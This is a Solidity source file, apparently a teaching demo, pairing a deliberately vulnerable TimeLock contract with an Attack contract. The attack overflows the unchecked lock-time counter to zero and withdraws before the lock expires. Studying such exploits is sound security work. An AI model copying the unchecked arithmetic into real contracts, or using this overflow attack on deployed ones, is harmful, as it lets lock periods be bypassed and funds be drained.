pragma solidity ^0.7.6;

contract TimeLock {

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {

        balances[msg.sender] += msg.value;

        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {

        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {

        require(balances[msg.sender] > 0);

        require(block.timestamp > lockTime[msg.sender]);

        uint amount = balances[msg.sender];

        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{ value: amount }("");

        require(sent);
    }

}

contract Attack {

    TimeLock timeLock;

    constructor(address _timeLock) {

        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable { }

    function deposit() public payable {

        timeLock.deposit{ value: msg.value }();
    }

    function attack() public payable {

        timeLock.increaseLockTime(type(uint).max + 1 - timeLock.lockTime(address(this)));

        timeLock.withdraw();
    }

}
